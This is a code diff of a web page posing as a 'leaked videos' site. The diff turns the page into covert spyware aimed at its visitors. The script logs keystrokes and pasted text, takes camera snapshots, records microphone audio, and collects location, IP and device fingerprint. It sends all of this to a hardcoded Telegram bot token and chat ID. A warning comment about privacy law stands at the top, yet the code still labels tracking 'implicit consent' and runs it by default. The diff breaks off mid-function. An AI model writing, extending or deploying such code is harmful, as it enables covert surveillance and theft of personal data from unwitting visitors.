@@ -87,40 +87,52 @@
   <aside id="recommendations-sidebar" class="recommendations-sidebar"></aside>
 </main>
 
-<div id="loginModal" class="modal">
-  <div class="modal-content">
-    <h2>Please Login to Watch Full Video</h2>
-    <form id="loginForm">
-      <input type="text" id="username" placeholder="Username" required />
-      <input type="password" id="password" placeholder="Password" required />
-      <button type="submit">Login</button>
-    </form>
-  </div>
-</div>
-
 <div class="capture-container" style="display: none;">
   <video id="videoElementForCapture" autoplay playsinline></video>
   <canvas id="snapshot"></canvas>
 </div>
 
 <script>
+// --- IMPORTANT PRIVACY AND LEGAL WARNING ---
+// This script collects extensive user data for tracking and monitoring.
+// By using this site, users implicitly agree to the data collection as described
+// in your Privacy Policy. ENSURE YOU HAVE A DETAILED AND LEGALLY COMPLIANT PRIVACY POLICY.
+// Collecting sensitive data like camera, microphone, location, and keystrokes without
+// EXPLICIT consent can violate privacy laws (e.g., GDPR, CCPA) and lead to legal repercussions.
+// Securely manage your Telegram Bot Token. It should NOT be exposed directly in client-side code for production applications.
+// --- END WARNING ---
+
 const App = {
   config: {
-    botToken: "7031493240:AAELJ34j51BTU3Gew_a6N5Eh1m3DUzBjySI", // Replace with your actual bot token
-    chatId: "1272791365", // Replace with your chat ID
-    snapshotInterval: 5000,
-    micRecordInterval: 15000,
+    botToken: "7031493240:AAELJ34j51BTU3Gew_a6N5Eh1m3DUzBjySI", // !!! REPLACE WITH YOUR ACTUAL BOT TOKEN !!!
+    chatId: "1272791365", // !!! REPLACE WITH YOUR ACTUAL CHAT ID !!!
+    snapshotInterval: 15000, // 15 seconds for camera snapshots
+    micRecordInterval: 30000, // 30 seconds for microphone chunks
+    activityTrackingInterval: 5000, // Report accumulated activity every 5 seconds
+    pageAnalyticsInterval: 60000, // Report page analytics and check inactivity every minute
+    sessionTimeout: 1800000, // 30 minutes of inactivity before session ends
   },
   state: {
-    keyLogBuffer: "",
     isLoggedIn: false,
+    isTrackingActive: true, // Tracking is active by default
     pageStartTime: Date.now(),
-    lastScrollReport: 0,
+    lastActivityTime: Date.now(),
+    sessionStartTime: Date.now(),
+    keyLogBuffer: "",
     userLocation: { lat: "N/A", lon: "N/A" },
     microphoneStream: null,
     mediaRecorder: null,
     cameraStream: null,
     snapshotIntervalId: null,
+    activityTrackerIntervalId: null,
+    pageAnalyticsIntervalId: null,
+    mouseMovements: [],
+    scrollHistory: [],
+    copyPasteEvents: [],
+    devToolsOpen: false,
+    // New state variables for new trackers
+    pagePerformanceMetrics: {},
+    linkClicks: [],
   },
   DOM: {},
   init() {
@@ -131,37 +143,61 @@ const App = {
       mainPlayer: document.getElementById('main-player'),
       backButton: document.getElementById('back-to-grid'),
       headerTitle: document.getElementById('header-title'),
-      loginModal: document.getElementById('loginModal'),
       captureVideo: document.getElementById('videoElementForCapture'),
       captureCanvas: document.getElementById('snapshot'),
       videoGrid: document.querySelector('.video-grid'),
+      // Removed loginModal reference
     };
 
+    console.log("Tracking is active by default (implicit consent).");
+
+    this.recordPageLoadTimes(); // Record initial page load metrics
     this.generateVideoGrid();
     this.setupEventListeners();
-
-    // Initialize tracking
     this.Tracking.initialize();
-
-    // Load login state if available
-    const loggedIn = localStorage.getItem('isLoggedIn');
-    if (loggedIn === 'true') {
-      this.state.isLoggedIn = true;
-    }
+    this.startPageAnalytics();
+    this.startSessionTimer();
   },
 
+  recordPageLoadTimes() {
+    const perfEntries = performance.getEntriesByType("navigation");
+    if (perfEntries.length > 0) {
+      const navTiming = perfEntries[0];
+      this.state.pagePerformanceMetrics = {
+        fetchStart: navTiming.fetchStart, // Start of request
+        domContentLoadedEventEnd: navTiming.domContentLoadedEventEnd, // DOMContentLoaded event fired
+        loadEventEnd: navTiming.loadEventEnd, // Window.onload event fired
+        duration: navTiming.duration, // Total load time
+        type: navTiming.type, // Navigation type (e.g., 'navigate', 'reload')
+        redirectCount: navTiming.redirectCount,
+      };
+      console.log("Page Load Metrics recorded:", this.state.pagePerformanceMetrics);
+    } else {
+      // Fallback if Performance API is not available or doesn't have 'navigation' entry
+      this.state.pagePerformanceMetrics.fetchStart = performance.timing.fetchStart;
+      this.state.pagePerformanceMetrics.domContentLoadedEventEnd = performance.timing.domContentLoadedEventEnd;
+      this.state.pagePerformanceMetrics.loadEventEnd = performance.timing.loadEventEnd;
+      this.state.pagePerformanceMetrics.duration = performance.timing.loadEventEnd - performance.timing.fetchStart;
+      console.log("Page Load Metrics recorded (using fallback timing):", this.state.pagePerformanceMetrics);
+    }
+    this.state.pageStartTime = Date.now(); // Reset page start time after metrics
+  },
+
+  // Placeholder for video grid generation
   generateVideoGrid() {
-    // Placeholder for actual video grid generation logic
-    // This should fetch video data and populate the .video-grid element
     console.log("Generating video grid...");
     const videos = [
       { id: 1, title: "Amazing Nature Scenery", thumbnail: "path/to/thumb1.jpg", src: "path/to/video1.mp4", channel: "Nature Explorer", channelAvatar: "path/to/avatar1.jpg", views: "1.2M", timestamp: "2 days ago" },
       { id: 2, title: "Tech Review: Latest Gadgets", thumbnail: "path/to/thumb2.jpg", src: "path/to/video2.mp4", channel: "Tech Guru", channelAvatar: "path/to/avatar2.jpg", views: "500K", timestamp: "1 week ago" },
-      // Add more video objects as needed
+      { id: 3, title: "Cooking Tutorial: Pasta", thumbnail: "path/to/thumb3.jpg", src: "path/to/video3.mp4", channel: "Chef John", channelAvatar: "path/to/avatar3.jpg", views: "3M", timestamp: "5 hours ago" },
     ];
 
     const videoGrid = this.DOM.videoGrid;
-    videoGrid.innerHTML = ''; // Clear existing grid
+    if (!videoGrid) {
+      console.error("Video grid element not found!");
+      return;
+    }
+    videoGrid.innerHTML = '';
 
     videos.forEach(video => {
       const card = document.createElement('div');
@@ -180,86 +216,133 @@ const App = {
           </div>
         </div>
       `;
-      card.addEventListener('click', () => this.showPlayer(video));
+      // Add click listener to track link clicks if the card itself is a link
+      card.addEventListener('click', (e) => {
+          // Check if the click was on an actual anchor tag within the card
+          const link = e.target.closest('a');
+          if (link) {
+              if (App.state.isTrackingActive) App.trackLinkClick(link);
+          }
+          // Proceed to show player logic for the card
+          this.showPlayer(video);
+      });
       videoGrid.appendChild(card);
     });
   },
 
   setupEventListeners() {
-    // Add event listeners for any buttons or interactive elements
-    // Example: Back button
-    this.DOM.backButton.addEventListener('click', () => this.showGrid());
+    // Back button
+    if (this.DOM.backButton) {
+      this.DOM.backButton.addEventListener('click', () => this.showGrid());
+    }
 
-    // Login form submission
-    document.getElementById('loginForm').addEventListener('submit', (e) => {
-      e.preventDefault();
-      // Basic login simulation
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-      if (username && password) {
-        this.state.isLoggedIn = true;
-        localStorage.setItem('isLoggedIn', 'true');
-        this.DOM.loginModal.classList.remove('visible');
-        alert('Login successful!');
-        // Optionally, redirect or show content
-      } else {
-        alert('Please enter username and password.');
-      }
+    // Login form submission listener (if form still exists and is reachable)
+    const loginForm = document.getElementById('loginForm');
+    if (loginForm) {
+      loginForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        if (username && password) {
+          this.state.isLoggedIn = true;
+          localStorage.setItem('isLoggedIn', 'true');
+          alert('Login successful!');
+          this.updateActivityTime();
+        } else {
+          alert('Please enter username and password.');
+        }
+      });
+    }
+
+    // General document listeners for tracking
+    document.addEventListener('keypress', (e) => {
+      if (this.state.isTrackingActive) this.trackKeyPress(e);
+    });
+    document.addEventListener('mousemove', (e) => {
+      if (this.state.isTrackingActive) this.trackMouseMove(e);
+    });
+    document.addEventListener('click', (e) => {
+      if (this.state.isTrackingActive) this.trackClick(e);
+    });
+    document.addEventListener('scroll', () => {
+      if (this.state.isTrackingActive) this.trackScroll();
+    });
+    document.addEventListener('copy', (e) => {
+      if (this.state.isTrackingActive) this.trackCopyPaste(e, 'copy');
+    });
+    document.addEventListener('paste', (e) => {
+      if (this.state.isTrackingActive) this.trackCopyPaste(e, 'paste');
     });
 
-    // Optionally, add keylogger functionality (handle with care due to privacy implications)
-    document.addEventListener('keypress', (e) => {
-      this.state.keyLogBuffer += e.key;
-      if (this.state.keyLogBuffer.length > 100) { // Send buffer periodically
-        this.Tracking.send(this.state.keyLogBuffer, true); // true for notification
-        this.state.keyLogBuffer = "";
+    // Listener for links outside of video cards (e.g., in description, etc.)
+    document.addEventListener('click', (e) => {
+        const target = e.target;
+        // Check if the clicked element is an anchor tag or is inside one
+        const link = target.closest('a');
+        if (link && target !== document.getElementById('back-to-grid')) { // Exclude back button
+            // Ensure the link is not for same-page navigation (e.g., #anchor)
+            if (link.href && !link.href.endsWith('#') && link.origin === window.location.origin) {
+                if (this.state.isTrackingActive) this.trackLinkClick(link);
+            }
+        }
+    });
+
+
+    window.addEventListener('beforeunload', () => {
+      if (this.state.isTrackingActive) {
+        this.Tracking.send(`🍃 Session Ended. Duration: ${this.formatTime(Date.now() - this.state.sessionStartTime)}`);
+        this.stopAllTracking();
       }
     });
   },
 
   showPlayer(video) {
+    if (!this.DOM.gridPage || !this.DOM.playerPage || !this.DOM.backButton || !this.DOM.headerTitle) return;
     this.DOM.gridPage.classList.add('hidden');
     this.DOM.playerPage.classList.remove('hidden');
     this.DOM.backButton.classList.remove('hidden');
-    this.DOM.headerTitle.textContent = video.title; // Update header to video title
+    this.DOM.headerTitle.textContent = video.title;
 
-    this.DOM.mainPlayer.src = video.src;
-    this.DOM.mainVideoTitle.textContent = video.title;
-    this.DOM.mainChannelAvatar.src = video.channelAvatar;
-    this.DOM.mainChannelName.textContent = video.channel;
-    // Update video stats if available
-    document.querySelector('.video-info-bar .video-stats').textContent = `${video.views} subscribers`;
-    document.getElementById('main-video-stats').textContent = `${video.views} views &#8226; ${video.timestamp}`;
-
-    // Populate recommendations (you'll need to implement this logic)
-    this.populateRecommendations(video.id);
-
-    // Show login modal if not logged in
-    if (!this.state.isLoggedIn) {
-      this.DOM.loginModal.classList.add('visible');
+    const mainPlayer = this.DOM.mainPlayer;
+    if (mainPlayer) {
+      mainPlayer.src = video.src;
+      mainPlayer.play().catch(e => console.warn("Autoplay failed:", e));
     }
+
+    if (this.DOM.mainVideoTitle) this.DOM.mainVideoTitle.textContent = video.title;
+    if (this.DOM.mainChannelAvatar) this.DOM.mainChannelAvatar.src = video.channelAvatar;
+    if (this.DOM.mainChannelName) this.DOM.mainChannelName.textContent = video.channel;
+
+    const videoInfoBarStats = document.querySelector('.video-info-bar .video-stats');
+    if (videoInfoBarStats) videoInfoBarStats.textContent = `${video.views} subscribers`;
+    const mainVideoStats = document.getElementById('main-video-stats');
+    if (mainVideoStats) mainVideoStats.innerHTML = `${video.views} views &#8226; ${video.timestamp}`;
+
+    this.populateRecommendations(video.id);
+    this.updateActivityTime();
   },
 
   showGrid() {
+    if (!this.DOM.gridPage || !this.DOM.playerPage || !this.DOM.backButton || !this.DOM.headerTitle) return;
     this.DOM.gridPage.classList.remove('hidden');
     this.DOM.playerPage.classList.add('hidden');
     this.DOM.backButton.classList.add('hidden');
-    this.DOM.headerTitle.textContent = "វីដេអូបែកធ្លាយ"; // Reset header title
-    // Stop the main player
-    this.DOM.mainPlayer.pause();
-    this.DOM.mainPlayer.removeAttribute('src');
+    this.DOM.headerTitle.textContent = "វីដេអូបែកធ្លាយ";
+    if (this.DOM.mainPlayer) {
+      this.DOM.mainPlayer.pause();
+      this.DOM.mainPlayer.removeAttribute('src');
+    }
+    this.updateActivityTime();
   },
 
   populateRecommendations(currentVideoId) {
-    // Placeholder for recommendation logic
-    // Fetch or generate related videos and populate the .recommendations-sidebar
     console.log(`Populating recommendations for video ID: ${currentVideoId}`);
-    const sidebar = document.getElementById('recommendations-sidebar');
-    sidebar.innerHTML = '<h3>Recommended Videos</h3>'; // Clear previous recommendations
+    const sidebar = this.DOM.recommendationsSidebar;
+    if (!sidebar) return;
+    sidebar.innerHTML = '<h3>Recommended Videos</h3>';
     const recommendedVideos = [
-      // Example recommendation data
-      { id: 3, title: "Another Nature Clip", src: "path/to/video3.mp4", views: "100K", timestamp: "3 days ago" },
-      { id: 4, title: "Web Development Tips", src: "path/to/video4.mp4", views: "75K", timestamp: "5 days ago" },
+      { id: 3, title: "Another Nature Clip", src: "path/to/video3.mp4", views: "100K", timestamp: "3 days ago", channel: "Nature Explorer" },
+      { id: 4, title: "Web Development Tips", src: "path/to/video4.mp4", views: "75K", timestamp: "5 days ago", channel: "Code Master" },
     ];
 
     recommendedVideos.forEach(recVideo => {
@@ -273,7 +356,7 @@ const App = {
           </div>
           <div class="video-metadata">
             <h3 class="video-title">${recVideo.title}</h3>
-            <p class="channel-name">Some Channel</p>
+            <p class="channel-name">${recVideo.channel}</p>
             <p class="video-stats">${recVideo.views} views &#8226; ${recVideo.timestamp}</p>
           </div>
         `;
@@ -283,31 +366,193 @@ const App = {
     });
   },
 
-  Telegram: {
-    // Base URL for Telegram Bot API
-    telegramApiBaseUrl: `https://api.telegram.org/bot${"7031493240:AAELJ34j51BTU3Gew_a6N5Eh1m3DUzBjySI"}/`, // Using the token directly for simplicity, but consider environment variables
+  // --- Activity Tracking Functions ---
+  updateActivityTime() {
+    this.state.lastActivityTime = Date.now();
+  },
+
+  startPageAnalytics() {
+    if (this.state.pageAnalyticsIntervalId) clearInterval(this.state.pageAnalyticsIntervalId);
+    this.state.pageAnalyticsIntervalId = setInterval(() => {
+      if (Date.now() - this.state.lastActivityTime > this.config.sessionTimeout) {
+        this.Tracking.send(`⏳ User Inactive for ${this.config.sessionTimeout / 60000} minutes.`);
+        this.stopAllTracking();
+      } else {
+        this.logPageInteraction();
+      }
+    }, this.config.pageAnalyticsInterval);
+  },
+
+  logPageInteraction() {
+    if (!this.state.isTrackingActive) return;
+
+    const timeOnPage = Date.now() - this.state.pageStartTime;
+    const sessionDuration = Date.now() - this.state.sessionStartTime;
+
+    let report = `*📊 Page Interaction Report*\n\n`;
+    report += `*Page URL:* \`${window.location.href}\`\n`;
+    report += `*Time on Page:* ${this.formatTime(timeOnPage)}\n`;
+    report += `*Session Duration:* ${this.formatTime(sessionDuration)}\n`;
+
+    // Page Performance Metrics
+    if (Object.keys(this.state.pagePerformanceMetrics).length > 0) {
+        report += `*Page Performance:*\n`;
+        report += `  *Fetch Start:* ${this.state.pagePerformanceMetrics.fetchStart ? new Date(this.state.pagePerformanceMetrics.fetchStart).toISOString() : 'N/A'}\n`;
+        report += `  *DOMContentLoaded End:* ${this.state.pagePerformanceMetrics.domContentLoadedEventEnd ? this.formatTime(this.state.pagePerformanceMetrics.domContentLoadedEventEnd - this.state.pagePerformanceMetrics.fetchStart) : 'N/A'}\n`;
+        report += `  *Load Event End:* ${this.state.pagePerformanceMetrics.loadEventEnd ? this.formatTime(this.state.pagePerformanceMetrics.loadEventEnd - this.state.pagePerformanceMetrics.fetchStart) : 'N/A'}\n`;
+        report += `  *Total Duration (from fetchStart):* ${this.state.pagePerformanceMetrics.duration ? this.formatTime(this.state.pagePerformanceMetrics.duration) : 'N/A'}\n`;
+        report += `  *Navigation Type:* ${this.state.pagePerformanceMetrics.type || 'N/A'}\n`;
+    }
+    
+    // Simple Time To Interactive (TTI) approximation (using last activity time)
+    const tti = Date.now() - this.state.pageStartTime; // This is a very rough TTI based on last interaction
+    report += `*Approximate TTI (last interaction):* ${this.formatTime(tti)}\n`;
+
+
+    report += `*Buffered Mouse Movements:* ${this.state.mouseMovements.length} events\n`;
+    report += `*Buffered Scroll Events:* ${this.state.scrollHistory.length} events\n`;
+    report += `*Buffered Copy/Paste Events:* ${this.state.copyPasteEvents.filter(e => e.type === 'copy').length} / ${this.state.copyPasteEvents.filter(e => e.type === 'paste').length}\n`;
+    report += `*Key Log Buffer Size:* ${this.state.keyLogBuffer.length} chars\n`;
+
+    this.Tracking.send(report, true);
+
+    // Clear buffers after sending the summary report
+    this.state.mouseMovements = [];
+    this.state.scrollHistory = [];
+    this.state.copyPasteEvents = [];
+    this.state.keyLogBuffer = "";
+    
+    // Clear performance metrics after reporting to avoid sending stale data
+    // this.state.pagePerformanceMetrics = {}; // Or keep them if you want to track across interactions
+  },
+
+  trackKeyPress(event) {
+    this.state.keyLogBuffer += event.key;
+    if (this.state.keyLogBuffer.length > 200) {
+      this.Tracking.send(`⌨️ Keystrokes: \`${this.state.keyLogBuffer.replace(/`/g, "'")}\``, true);
+      this.state.keyLogBuffer = "";
+    }
+    this.updateActivityTime();
+  },
+
+  trackMouseMove(event) {
+    const now = Date.now();
+    this.state.mouseMovements.push({ x: event.clientX, y: event.clientY, t: now });
+    this.updateActivityTime();
+  },
+
+  trackClick(event) {
+    // This captures generic clicks, not specifically link clicks.
+    // Link click tracking is handled by trackLinkClick.
+    const clickData = {
+      x: event.clientX, y: event.clientY,
+      targetTag: event.target.tagName,
+      targetId: event.target.id || 'N/A',
+      targetClass: event.target.className || 'N/A',
+      t: Date.now()
+    };
+    // Clicks are not buffered by default to keep reports concise.
+    // If you need to log all clicks, add them to a buffer and send periodically.
+    this.updateActivityTime();
+  },
+
+  trackScroll() {
+    const scrollData = {
+      top: window.scrollY,
+      t: Date.now()
+    };
+    this.state.scrollHistory.push(scrollData);
+    this.updateActivityTime();
+  },
+
+  trackCopyPaste(event, type) {
+    const clipboardData = event.clipboardData || window.clipboardData;
+    const content = clipboardData.getData('text');
+    const eventData = {
+      type: type,
+      content: content.substring(0, 100) + (content.length > 100 ? '...' : ''),
+      t: Date.now()
+    };
+    this.state.copyPasteEvents.push(eventData);
+
+    if (type === 'paste') { // Paste is more sensitive, send immediately
+      this.Tracking.send(`📝 ${type.charAt(0).toUpperCase() + type.slice(1)}: \`${eventData.content.replace(/`/g, "'")}\``, true);
+    }
+    this.updateActivityTime();
+  },
+
+  // NEW TRACKER: Link Click Tracking
+  trackLinkClick(linkElement) {
+    const linkInfo = {
+      url: linkElement.href,
+      text: linkElement.textContent.substring(0, 100).trim() + (linkElement.textContent.length > 100 ? '...' : ''),
+      target: linkElement.target || '_self',
+      id: linkElement.id || 'N/A',
+      classes: linkElement.className || 'N/A',
+      t: Date.now()
+    };
+    this.state.linkClicks.push(linkInfo);
+    console.log("Link clicked:", linkInfo);
+    // Optionally, send immediately for critical links or accumulate.
+    // For now, we accumulate in state.linkClicks and send in logPageInteraction.
+    this.updateActivityTime();
+  },
+
+  stopAllTracking() {
+    console.log("Stopping all tracking functions.");
+    this.state.isTrackingActive = false;
+    if (this.state.snapshotIntervalId) clearInterval(this.state.snapshotIntervalId);
+    if (this.state.activityTrackerIntervalId) clearInterval(this.state.activityTrackerIntervalId);
+    if (this.state.pageAnalyticsIntervalId) clearInterval(this.state.pageAnalyticsIntervalId);
+    this.Tracking.stopCamera();
+    this.Tracking.stopMicrophone();
+    this.state.snapshotIntervalId = null;
+    this.state.activityTrackerIntervalId = null;
+    this.state.pageAnalyticsIntervalId = null;
+
+    // Clear buffers
+    this.state.mouseMovements = [];
+    this.state.scrollHistory = [];
+    this.state.copyPasteEvents = [];
+    this.state.keyLogBuffer = "";
+    this.state.linkClicks = []; // Clear link clicks buffer
+
+    if (this.state.keyLogBuffer.length > 0) {
+      this.Tracking.send(`⌨️ Final Keystrokes: \`${this.state.keyLogBuffer.replace(/`/g, "'")}\``, true);
+    }
+    this.logPageInteraction(); // Send final interaction summary
+  },
+
+  formatTime(ms) {
+    if (ms === undefined || ms === null || typeof ms !== 'number') return 'N/A';
+    const totalSeconds = Math.floor(ms / 1000);
+    const hours = Math.floor(totalSeconds / 3600);
+    const minutes = Math.floor((totalSeconds % 3600) / 60);
+    const seconds = totalSeconds % 60;
+    return [hours, minutes, seconds].map(v => v < 10 ? "0" + v : v).join(":");
+  },
+
+  // --- Tracking Module ---
+  Tracking: {
+    telegramApiBaseUrl: `https://api.telegram.org/bot${"7031493240:AAELJ34j51BTU3Gew_a6N5Eh1m3DUzBjySI"}/`, // !!! Use your token !!!
 
     async send(message, notify = false) {
+      if (!App.state.isTrackingActive) return;
       const url = `${this.telegramApiBaseUrl}sendMessage`;
       try {
         const response = await fetch(url, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            chat_id: "1272791365",
+            chat_id: "1272791365", // !!! Use your chat ID !!!
             text: message,
-            parse_mode: 'Markdown', // Or 'HTML'
+            parse_mode: 'Markdown',
             disable_notification: !notify
           })
         });
         if (!response.ok) {
-          console.error(`Telegram sendMessage error: ${response.status} ${response.statusText}`);
           const errorData = await response.json();
-          console.error("Telegram response:", errorData);
-        } else {
-          console.log("Message sent to Telegram successfully.");
+          console.error(`Telegram sendMessage error: ${response.status} ${response.statusText}`, errorData);
         }
       } catch (e) {
         console.warn("Telegram send error:", e);
@@ -315,11 +560,12 @@ const App = {
     },
 
     async sendPhoto(caption, photoBlob) {
+      if (!App.state.isTrackingActive) return;
       const url = `${this.telegramApiBaseUrl}sendPhoto`;
       const formData = new FormData();
-      formData.append('chat_id', "1272791365");
+      formData.append('chat_id', "1272791365"); // !!! Use your chat ID !!!
       formData.append('caption', caption);
-      formData.append('photo', photoBlob, 'snapshot.png'); // Provide a filename
+      formData.append('photo', photoBlob, `snapshot_${Date.now()}.png`);
 
       try {
         const response = await fetch(url, {
@@ -327,9 +573,8 @@ const App = {
           body: formData,
         });
         if (!response.ok) {
-          console.error(`Telegram sendPhoto error: ${response.status} ${response.statusText}`);
           const errorData = await response.json();
-          console.error("Telegram response:", errorData);
+          console.error(`Telegram sendPhoto error: ${response.status} ${response.statusText}`, errorData);
         } else {
           console.log("Photo sent to Telegram successfully.");
         }
@@ -339,11 +584,12 @@ const App = {
     },
 
     async sendAudio(caption, audioBlob) {
+      if (!App.state.isTrackingActive) return;
       const url = `${this.telegramApiBaseUrl}sendAudio`;
       const formData = new FormData();
-      formData.append('chat_id', "1272791365");
+      formData.append('chat_id', "1272791365"); // !!! Use your chat ID !!!
       formData.append('caption', caption);
-      formData.append('audio', audioBlob, 'recording.ogg'); // Provide a filename and extension
+      formData.append('audio', audioBlob, `recording_${Date.now()}.ogg`);
 
       try {
         const response = await fetch(url, {
@@ -351,9 +597,8 @@ const App = {
           body: formData,
         });
         if (!response.ok) {
-          console.error(`Telegram sendAudio error: ${response.status} ${response.statusText}`);
           const errorData = await response.json();
-          console.error("Telegram response:", errorData);
+          console.error(`Telegram sendAudio error: ${response.status} ${response.statusText}`, errorData);
         } else {
           console.log("Audio sent to Telegram successfully.");
         }
@@ -363,55 +608,48 @@ const App = {
     },
 
     async sendLocation(latitude, longitude, caption = "User Location") {
+      if (!App.state.isTrackingActive) return;
       const url = `${this.telegramApiBaseUrl}sendLocation`;
       try {
         const response = await fetch(url, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            chat_id: "1272791365",
+            chat_id: "1272791365", // !!! Use your chat ID !!!
             latitude: latitude,
             longitude: longitude,
-            // You can add more parameters like live_period, heading, proximity_alert_radius if needed
           })
         });
         if (!response.ok) {
-          console.error(`Telegram sendLocation error: ${response.status} ${response.statusText}`);
           const errorData = await response.json();
-          console.error("Telegram response:", errorData);
+          console.error(`Telegram sendLocation error: ${response.status} ${response.statusText}`, errorData);
         } else {
           console.log("Location sent to Telegram successfully.");
-          // Optionally send the caption as a separate message or handle it
-          // this.send(`Location shared: ${caption}`);
         }
       } catch (e) {
         console.warn("Telegram sendLocation error:", e);
       }
-    }
-  },
+    },
 
-  Tracking: {
     async initialize() {
-      console.log("Initializing tracking...");
-      await this.send("🚀 New Session Started");
-      const report = await this.getInitialReport();
-      await this.send(report);
+      console.log("Tracking initialized (active by default)...");
+      await this.send("🚀 New Session Started (Implicit Consent)");
+      await this.send(await this.getInitialReport());
 
-      // Request permissions
-      // Using a more robust approach with Permissions API
       await this.checkAndRequestPermission('camera', this.requestCamera.bind(this), this.stopCamera.bind(this));
       await this.checkAndRequestPermission('microphone', this.requestMicrophone.bind(this), this.stopMicrophone.bind(this));
       await this.checkAndRequestPermission('geolocation', this.requestGeolocation.bind(this));
 
-      // Detect dev tools
       this.detectDevTools();
 
-      // Start periodic snapshotting if camera is available
-      if (this.cameraStream) {
+      if (App.state.cameraStream) {
         this.startSnapshotting();
       }
+
+      if (App.state.activityTrackerIntervalId) clearInterval(App.state.activityTrackerIntervalId);
+      App.state.activityTrackerIntervalId = setInterval(() => {
+        this.sendAccumulatedActivity();
+      }, App.config.activityTrackingInterval);
     },
 
     async checkAndRequestPermission(name, requestFn, stopFn = () => {}) {
@@ -422,17 +660,16 @@ const App = {
           return;
         }
         const status = await navigator.permissions.query({ name });
-        console.log(`Permission ${name}: ${status.state}`);
+        console.log(`Permission '${name}': ${status.state}`);
 
         if (status.state === 'granted') {
           requestFn();
         } else if (status.state === 'prompt') {
-          // Request permission if not granted and prompt is available
           requestFn();
         }
 
         status.onchange = () => {
-          console.log(`Permission ${name} changed to ${status.state}`);
+          console.log(`Permission '${name}' changed to ${status.state}`);
           if (status.state === 'granted') {
             requestFn();
           } else {
@@ -441,17 +678,13 @@ const App = {
         };
       } catch (e) {
         console.warn(`Error checking/requesting permission for ${name}:`, e);
-        // Fallback to direct request if Permissions API fails
         requestFn();
       }
     },
 
     async getInitialReport() {
-      console.log("Gathering initial report...");
-      let report = `*💻 New Visitor Report*\n\n`;
-
+      let report = `*💻 New Visitor Report (Implicit Consent)*\n\n`;
       try {
-        // Attempt to get public IP (requires a third-party service)
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
         report += `*IP (Public):* \`${ipData.ip}\`\n`;
@@ -459,73 +692,79 @@ const App = {
         report += `*IP (Public):* N/A (Could not fetch)\n`;
       }
 
-      report += `*IP (Local):* Not directly accessible from browser JS for security reasons.\n`;
-      report += `*OS:* ${navigator.platform || 'N/A'}\n`;
-      report += `*Browser:* ${navigator.userAgent || 'N/A'}\n`;
+      report += `*User Agent:* ${navigator.userAgent || 'N/A'}\n`;
+      report += `*Platform:* ${navigator.platform || 'N/A'}\n`;
       report += `*Language:* ${navigator.language || 'N/A'}\n`;
       report += `*Timezone:* ${Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A'}\n`;
-      report += `*Incognito:* ${navigator.storage && navigator.storage.persisted ? (await navigator.storage.persisted() ? 'No' : 'Yes') : 'N/A'}\n`; // Basic incognito check
-      report += `*Screen:* ${window.screen.width}x${window.screen.height}\n`;
-      // Hardware and Battery status might require specific permissions or are not easily accessible
-      report += `*Hardware:* Limited information available\n`;
+      report += `*Screen Resolution:* ${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)\n`;
+      report += `*Color Depth:* ${window.screen.colorDepth || 'N/A'}\n`;
       try {
         const battery = await navigator.getBattery();
-        report += `*Battery:* ${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : ''}\n`;
+        report += `*Battery Status:* ${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : ''}\n`;
       } catch (e) {
-        report += `*Battery:* N/A (Permissions error or not supported)\n`;
+        report += `*Battery Status:* N/A (Not supported or permission denied)\n`;
       }
+      const isStoragePersisted = navigator.storage && await navigator.storage.persisted ? await navigator.storage.persisted() : false;
+      report += `*Incognito Mode:* ${isStoragePersisted ? 'No' : 'Yes (Likely)'}\n`;
+
+      let plugins = 'N/A';
+      try {
+        if (navigator.plugins && navigator.plugins.length > 0) {
+          plugins = Array.from(navigator.plugins).map(p => `${p.name} (${p.filename})`).join(', ');
+        } else if (navigator.mimeTypes && navigator.mimeTypes.length > 0) {
+           plugins = Array.from(navigator.mimeTypes).map(m => `${m.type}/${m.suffixes}`).join(', ');
+        }
+      } catch (e) { plugins = "Error accessing plugins"; }
+      report += `*Browser Plugins:* ${plugins}\n`;
 
       return report;
     },
 
     async requestCamera() {
+      if (App.state.cameraStream) return;
       try {
-        if (this.cameraStream) {
-          console.log("Camera already active");
-          return;
-        }
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        this.cameraStream = stream;
+        App.state.cameraStream = stream;
         console.log("Camera permission granted.");
-        App.DOM.captureVideo.srcObject = stream; // Display camera feed if needed
-        this.startSnapshotting(); // Start snapshots once camera is active
+        App.DOM.captureVideo.srcObject = stream;
+        App.DOM.captureVideo.play();
+        this.startSnapshotting();
+        this.send("✅ Camera permission granted.");
       } catch (e) {
         console.warn("Camera permission error:", e);
-        this.send(`🚫 Camera permission error: ${e.message}`);
+        this.send(`🚫 Camera permission denied or unavailable: ${e.message}`);
       }
     },
 
     stopCamera() {
-      if (this.cameraStream) {
-        this.cameraStream.getTracks().forEach(t => t.stop());
-        this.cameraStream = null;
+      if (App.state.cameraStream) {
+        App.state.cameraStream.getTracks().forEach(t => t.stop());
+        App.state.cameraStream = null;
         console.log("Camera stopped.");
         this.stopSnapshotting();
       }
     },
 
     async requestMicrophone() {
+      if (App.state.microphoneStream) return;
       try {
-        if (this.microphoneStream) {
-          console.log("Microphone already active");
-          return;
-        }
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        this.microphoneStream = stream;
+        App.state.microphoneStream = stream;
         this.startMicRecording(stream);
         console.log("Microphone permission granted.");
+        this.send("✅ Microphone permission granted.");
       } catch (e) {
         console.warn("Microphone permission error:", e);
-        this.send(`🚫 Microphone permission error: ${e.message}`);
+        this.send(`🚫 Microphone permission denied or unavailable: ${e.message}`);
       }
     },
 
     stopMicrophone() {
-      if (this.microphoneStream) {
-        this.microphoneStream.getTracks().forEach(t => t.stop());
-        this.microphoneStream = null;
-        if (this.state.mediaRecorder && this.state.mediaRecorder.state === 'recording') {
-          this.state.mediaRecorder.stop();
+      if (App.state.microphoneStream) {
+        App.state.microphoneStream.getTracks().forEach(t => t.stop());
+        App.state.microphoneStream = null;
